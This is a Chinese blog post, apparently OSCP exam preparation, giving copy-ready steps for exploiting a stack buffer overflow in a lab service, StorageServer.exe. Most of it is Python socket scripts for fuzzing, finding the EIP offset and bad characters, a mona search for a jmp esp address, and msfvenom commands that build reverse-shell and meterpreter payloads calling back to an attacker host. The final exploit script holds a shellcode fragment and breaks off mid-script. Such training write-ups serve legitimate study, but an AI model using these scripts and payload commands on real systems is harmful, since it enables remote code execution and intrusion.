@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: true,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="这是在做OSCP过程中总结出来的新手照搬步骤。">
+<meta name="keywords" content="OSCP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP溢出题步骤">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;18&#x2F;OSCP%E6%BA%A2%E5%87%BA%E9%A2%98%E6%AD%A5%E9%AA%A4&#x2F;index.html">
+<meta property="og:site_name" content="LionKing">
+<meta property="og:description" content="这是在做OSCP过程中总结出来的新手照搬步骤。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;o4Gg7miVwcRtDQu.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;ngjZ9yKGohXl8cV.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;s4Xdg1bQPAIB8uk.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;8VoAnyTuFBmpcOs.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;7EbMoSzRJF9apmV.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;wdyiP7AnuIOtk5J.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;Zy1dmOX3HV2IGKD.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;AYG8lEK3FhgyCUk.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;8UBf6gcEeyoKTbp.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;aSyU9hLrlkKpwZv.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;uWsBo21pgakAPX4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;guX9cyBMzGDHLs4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;nqi56IXGtjQBPpd.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;Y3PWxgSNOUkMayb.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;jTSmRAXWYha9KpZ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;Uf3sM4VlHLIEDmY.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;eOYIznkg8Hsr7l2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;CMJgdn7XlioWPYk.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;n7GsMATVRhKcxbw.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;i4UOmoBZgd3spS7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;LwsRi7XmHcqAYgt.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;kV6mKIUbyN1BCDj.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;fw6CS1gbmQJtxTj.png">
+<meta property="og:updated_time" content="2021-02-18T11:15:13.050Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;o4Gg7miVwcRtDQu.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/02/18/OSCP%E6%BA%A2%E5%87%BA%E9%A2%98%E6%AD%A5%E9%AA%A4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>OSCP溢出题步骤 | LionKing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LionKing</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">安全小白成长之路</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/18/OSCP%E6%BA%A2%E5%87%BA%E9%A2%98%E6%AD%A5%E9%AA%A4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="LionKing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LionKing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          OSCP溢出题步骤
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-18 23:10:29 / 修改时间：19:15:13" itemprop="dateCreated datePublished" datetime="2021-02-18T23:10:29+08:00">2021-02-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这是在做OSCP过程中总结出来的新手照搬步骤。</p><a id="more"></a>
+<h4 id="复现崩溃"><a href="#复现崩溃" class="headerlink" title="复现崩溃"></a>复现崩溃</h4><p>运行目标程序（找出端口），尝试发送大字符串观察程序是否崩溃</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2400   //二分法找到境界值</span><br><span class="line">buffer=[filler]</span><br><span class="line"></span><br><span class="line">for string in buffer:                                                                                                                                                                                                                      </span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)                                                                                                                                                                                 </span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                                                                                                                                                                                     </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))                                                                                                                                                                                             </span><br><span class="line">    s.send((string))                                                                                                                                                                                                                       </span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+<p>根据1.py脚本，以二分法的方式找出程序崩溃的零界值（这里发现2300不崩溃，但是2400崩溃了）</p>
+<p><img src="https://i.loli.net/2021/02/18/o4Gg7miVwcRtDQu.png" alt="clipboard.png"></p>
+<p><img src="https://i.loli.net/2021/02/18/ngjZ9yKGohXl8cV.png" alt="clipboard.png"></p>
+<h4 id="寻找EIP"><a href="#寻找EIP" class="headerlink" title="寻找EIP"></a>寻找EIP</h4><p>尝试找到崩溃的具体长度。使用msf中的pattern_create模块生成字符，方便定位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit    //工具路径</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/02/18/s4Xdg1bQPAIB8uk.png" alt="clipboard.png"></p>
+<p>将其放入2.py的filler中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A***********&quot;    //修改</span><br><span class="line">buffer=[filler]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+<p>管理员运行目标程序和Immunity Debugger（之后重新载入都需要管理员运行）<br>Immunity Debugger进入file-&gt;Attach-&gt;选择目标程序-&gt;点击运行按钮（右下角变为running）（载入步骤，同下“重新载入”）<br>运行2.py发现Immunity Debugger右下角变为黄色的Paused，表明程序崩溃了</p>
+<p><img src="https://i.loli.net/2021/02/18/8VoAnyTuFBmpcOs.png" alt="clipboard.png"></p>
+<p>观察EIP值，使用pattern_offfset工具定位</p>
+<p><img src="https://i.loli.net/2021/02/18/7EbMoSzRJF9apmV.png" alt="clipboard.png"></p>
+<h4 id="验证EIP"><a href="#验证EIP" class="headerlink" title="验证EIP"></a>验证EIP</h4><p>修改 3.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306    //修改</span><br><span class="line">eip = &quot;B&quot;*4    //添加B字符先占位子</span><br><span class="line">offset = &quot;C&quot;*16  //添加C字符先占位子测试</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+<p>重新载入目标程序，运行3.py发现debugger程序Paused<br>观察EIP，若为42424242（B字符的ascll码）表明程序确实溢出了且可控！</p>
+<p><img src="https://i.loli.net/2021/02/18/wdyiP7AnuIOtk5J.png" alt="clipboard.png"></p>
+<p>观察上图ESP的值为0295EE6C，对应上图下框第3行C，表明下一步到达地址，所以我们需要修改offset的值为8去填补中间隔的8位<br>脚本修该如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;B&quot;*4</span><br><span class="line">offset = &quot;C&quot;*8    //修改处</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看shellcode空间是否足够（扩容测试）"><a href="#查看shellcode空间是否足够（扩容测试）" class="headerlink" title="查看shellcode空间是否足够（扩容测试）"></a>查看shellcode空间是否足够（扩容测试）</h4><p>一般我们的shellcode大小在300-400左右，但是有时候怕空间不够shellcode被截断就需要测试<br>我们现在的字符大小为：A<em>2306+B</em>4+C*8=2318 再加上可能需要的shellcode大小为400 就是等于2718。奢侈一点算3000<br>修改4.py如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;B&quot;*4</span><br><span class="line">offset = &quot;C&quot;*8</span><br><span class="line">buf = &quot;D&quot;*(3000-len(filler)-len(eip)-len(offset))    //添加，测试空间大小</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset + buf]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+<p>全部重新载入程序后运行4.py</p>
+<p><img src="https://i.loli.net/2021/02/18/Zy1dmOX3HV2IGKD.png" alt="clipboard.png"></p>
+<p>发现程序Paused<br>查看EIP对应地址是否任然为B(42)</p>
+<p><img src="https://i.loli.net/2021/02/18/AYG8lEK3FhgyCUk.png" alt="clipboard.png"></p>
+<p>查看4B下面是否为恰好的8个C，查看ESP对应地址是否为D</p>
+<p><img src="https://i.loli.net/2021/02/18/8UBf6gcEeyoKTbp.png" alt="clipboard.png"></p>
+<p>查看最后一行D地址为：02A6F110</p>
+<p><img src="https://i.loli.net/2021/02/18/aSyU9hLrlkKpwZv.png" alt="clipboard.png"></p>
+<p>查看第一行D地址为：02A6EE6C</p>
+<p><img src="https://i.loli.net/2021/02/18/uWsBo21pgakAPX4.png" alt="clipboard.png"></p>
+<p>计算最后一行D至第一行D的空间：02A6EE6C-02A6F110=676（10进制）</p>
+<p><img src="https://i.loli.net/2021/02/18/guX9cyBMzGDHLs4.png" alt="clipboard.png"></p>
+<p>676大小足够shellcode了</p>
+<h4 id="寻找坏字符badchars"><a href="#寻找坏字符badchars" class="headerlink" title="寻找坏字符badchars"></a>寻找坏字符badchars</h4><p>重新载入程序，使用5.py致使Paused</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;B&quot;*4</span><br><span class="line">offset = &quot;C&quot;*8</span><br><span class="line">badchars = &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset + badchars]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+<p>选择ESP地址，右键选择Follow in Dump<br><img src="https://i.loli.net/2021/02/18/nqi56IXGtjQBPpd.png" alt="clipboard.png"></p>
+<p>在左下角框使用16位16进制方便查看</p>
+<p><img src="https://i.loli.net/2021/02/18/Y3PWxgSNOUkMayb.png" alt="clipboard.png"></p>
+<p>观察从什么位置中断（正常应为01-FF）</p>
+<p><img src="https://i.loli.net/2021/02/18/jTSmRAXWYha9KpZ.png" alt="clipboard.png"></p>
+<p>此处为51处中断，则在5.py的badchars中删除\x51，再次测试寻找坏字符直至所有坏字符找出，该程序坏字符为\x00、\x51（\x00默认为坏字符）</p>
+<h4 id="查找jmp-esp"><a href="#查找jmp-esp" class="headerlink" title="查找jmp esp"></a>查找jmp esp</h4><p>接着使用上面的Debugger（不需要重新载入）<br>在最下面白框处输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona modules</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/02/18/Uf3sM4VlHLIEDmY.png" alt="clipboard.png"></p>
+<p><img src="https://i.loli.net/2021/02/18/eOYIznkg8Hsr7l2.png" alt="clipboard.png"></p>
+<p>寻找前4位为false的程序或dll（一般都为目标程序或者目标程序自带的dll，也有可能是系统dll）(oscp中会随漏洞程序文件夹中放入一个dll文件，选择它就对了！)<br>白框处再次输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona find -s &quot;\xff\xe4&quot; -m StorageServer.exe   //修改最后选择的程序、dll即可  // &quot;\xff\xe4&quot;就是jmp esp字节码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/02/18/CMJgdn7XlioWPYk.png" alt="clipboard.png"></p>
+<p>查看results，结果显示jmp esp 地址为1120110d（有多个一般选择第一个或者最贴近目标程序的那一个）</p>
+<h4 id="确认esp"><a href="#确认esp" class="headerlink" title="确认esp"></a>确认esp</h4><p>重新载入程序，点击跳转按钮，填入上面找到的jmp esp地址</p>
+<p><img src="https://i.loli.net/2021/02/18/n7GsMATVRhKcxbw.png" alt="clipboard.png"></p>
+<p>发现的确为jmp esp指令</p>
+<p><img src="https://i.loli.net/2021/02/18/i4UOmoBZgd3spS7.png" alt="clipboard.png"></p>
+<p>在该指令处“F2”下断点，点击“运行”按钮<br>修改6.py中eip地址（注意是倒着写），并运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;\x0d\x11\x20\x11&quot;    //修改</span><br><span class="line">offset = &quot;C&quot;*8</span><br><span class="line">buf = &quot;D&quot;*(3000-len(filler)-len(eip)-len(offset))</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset + buf]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+<p>发现程序Paused，并且EIP指向我们的目标程序StorageServer.exe（上面选择的哪个jmp esp程序就应该显示哪个，该处是目标exe程序）</p>
+<p><img src="https://i.loli.net/2021/02/18/LwsRi7XmHcqAYgt.png" alt="clipboard.png"></p>
+<p>使用“F7”步入发现EIP指向ESP 为正确结果</p>
+<p><img src="https://i.loli.net/2021/02/18/kV6mKIUbyN1BCDj.png" alt="clipboard.png"></p>
+<h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4><p>官方使用的参数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.17.137 LPORT=443  –e x86/shikata_ga_nai -b &quot;\x00\x51&quot; EXITFUNC=thread -f c</span><br></pre></td></tr></table></figure>
+<p>但是经过测试该程序不适合使用这个payload（需要根据实际情况生成）<br>该程序使用的payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.17.137 LPORT=443  –e x86/shikata_ga_nai -b &quot;\x00\x51&quot; EXITFUNC=thread -f c</span><br></pre></td></tr></table></figure>
+
+<p>编写7.py加入nops（\x90为nop指令，避免上面字符干扰shellcode，一般12就够了），并且将生成的shellcode写入exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;\x0d\x11\x20\x11&quot;</span><br><span class="line">offset = &quot;C&quot;*8</span><br><span class="line">nops = &quot;\x90&quot;*12    //添加</span><br><span class="line">exp = ( &quot;\xdd\xc2\xbe\xee\xc4\x38\x15\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;)      //生成的shellcode</span><br><span class="line">buf = &quot;D&quot;*(3000-len(filler)-len(eip)-len(offset)-len(nops)-len(exp))</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset + nops +exp + buf]</span><br><span 